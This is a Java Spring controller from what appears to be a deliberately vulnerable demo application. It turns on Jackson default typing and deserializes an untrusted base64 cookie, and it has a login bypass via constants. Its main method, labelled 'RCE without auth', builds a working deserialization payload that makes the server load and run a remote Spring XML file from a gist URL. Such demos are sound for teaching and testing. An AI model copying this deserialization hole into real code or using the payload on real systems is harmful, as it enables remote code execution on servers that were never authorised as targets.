package com.adioss.hack.controller;

import com.adioss.hack.model.LoginForm;
import com.adioss.hack.model.MusicOnHold;
import com.adioss.hack.utils.Constants;
import com.adioss.hack.utils.JwtKeyManager;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.URL;
import java.util.Base64;

@Controller
public class IndexController {
    private static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();
    private final JwtKeyManager jwtKeyManager;

    static {
        OBJECT_MAPPER.enableDefaultTyping();
    }

    public IndexController(JwtKeyManager jwtKeyManager) {
        this.jwtKeyManager = jwtKeyManager;
    }

    @GetMapping("/")
    public String getIndex(HttpServletResponse response, @CookieValue(value = "session", required = false) Object session) {
        try {
            if (session != null) {
                jwtKeyManager.checkSession(session);
                return "display";
            }
        } catch (Exception e) {
            //
        }
        Cookie cookie = new Cookie("musicOnHold", "");
        cookie.setMaxAge(0);
        response.addCookie(cookie);
        return "index";
    }

    @PostMapping(value = "/", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public ModelAndView postIndex(ModelMap model, HttpServletResponse response, @CookieValue(value = "musicOnHold", required = false) Object musicOnHoldValue,
                                  LoginForm loginForm) throws Exception {
        Cookie cookie;
        MusicOnHold value = null;
        if (!Constants.BYPASS_LOGIN.equals(loginForm.getLogin()) && !Constants.BYPASS_PASSWORD.equals(loginForm.getLogin())) {
            value = nextBase64MusicOnHoldValue(musicOnHoldValue);
        }

        if (value == null) {
            cookie = new Cookie("musicOnHold", "");
            cookie.setMaxAge(0);
            cookie.setHttpOnly(true);
            response.addCookie(cookie);
            cookie = new Cookie("session", createJWT());
            cookie.setHttpOnly(true);
            response.addCookie(cookie);
            return new ModelAndView("display", "display", model);
        } else {
            cookie = new Cookie("musicOnHold", encode(value));
            model.addAttribute("gifUrl", value.gifUrl.toString());
            model.addAttribute("content", value.content);
            response.addCookie(cookie);
            return new ModelAndView("index", "index", model);
        }

    }

    @GetMapping("/poweredBy")
    public String getPoweredBy(Model model) {
        model.addAttribute("name", "test");
        return "poweredBy";
    }

    private MusicOnHold nextBase64MusicOnHoldValue(Object musicOnHoldValue) throws java.io.IOException {
        MusicOnHold retrieved = null;
        if (musicOnHoldValue != null) {
            if (Constants.HACK_ACTIVATED) {
                retrieved = OBJECT_MAPPER.readValue(Base64.getDecoder().decode(musicOnHoldValue.toString()), MusicOnHold.class);
            }
        }
        MusicOnHold musicOnHold = new MusicOnHold();
        musicOnHold.index = retrieved != null ? ++retrieved.index : 1;
        musicOnHold.content = Constants.LYRICS_LINES.get(musicOnHold.index % Constants.LYRICS_LINES.size());
        musicOnHold.gifUrl = new URL(Constants.GIF_URLS.get(musicOnHold.index % Constants.GIF_URLS.size()));
        return musicOnHold;
    }

    private String encode(MusicOnHold musicOnHold) throws JsonProcessingException {
        return Base64.getEncoder().encodeToString(OBJECT_MAPPER.writeValueAsString(musicOnHold).getBytes());
    }

    private String createJWT() {
        String jwt = jwtKeyManager.createJWT();
        return Base64.getEncoder().encodeToString(jwt.getBytes());
    }

    /**
     * EXPLOIT 1 : RCE without auth
     */
    public static void main(String[] args) throws IOException {
        MusicOnHold musicOnHoldToEncode = new MusicOnHold();
        musicOnHoldToEncode.index = 1;
        musicOnHoldToEncode.content = "I just wanna tell you how";
        musicOnHoldToEncode.gifUrl = new URL("https://i.giphy.com/media/6b9QApjUesyOs/giphy.webp");
        // encode
        String writeValueAsString = OBJECT_MAPPER.writeValueAsString(musicOnHoldToEncode);
        System.out.println("serialized : " + writeValueAsString);
        String encodeToString = Base64.getEncoder().encodeToString(writeValueAsString.getBytes());
        // decode
        MusicOnHold musicOnHold = OBJECT_MAPPER.readValue(Base64.getDecoder().decode(encodeToString), MusicOnHold.class);
        System.out.println(musicOnHold.gifUrl.toString());

        // hack
        //// calc on windows
        String payload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://gist.githubusercontent.com/adioss/425a3e777498775e496345ab227b9223/raw/05465282b81d98420c83c5d2bb8ec3aa326bd0b4/jackson-rce-via-spel-on-windows\"]";
        //// python simple server
        // String payload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://gist.githubusercontent.com/adioss/425a3e777498775e496345ab227b9223/raw/05465282b81d98420c83c5d2bb8ec3aa326bd0b4/jackson-rce-via-spel-on-windows\"]";
        String hack = "{\"index\":1,\"content\":\"I just wanna tell you how\",\"gifUrl\":" + payload + "}";
        System.out.println(hack);
        hack = Base64.getEncoder().encodeToString(hack.getBytes());
        musicOnHold = OBJECT_MAPPER.readValue(Base64.getDecoder().decode(hack), MusicOnHold.class);
        System.out.println(musicOnHold);
    }
}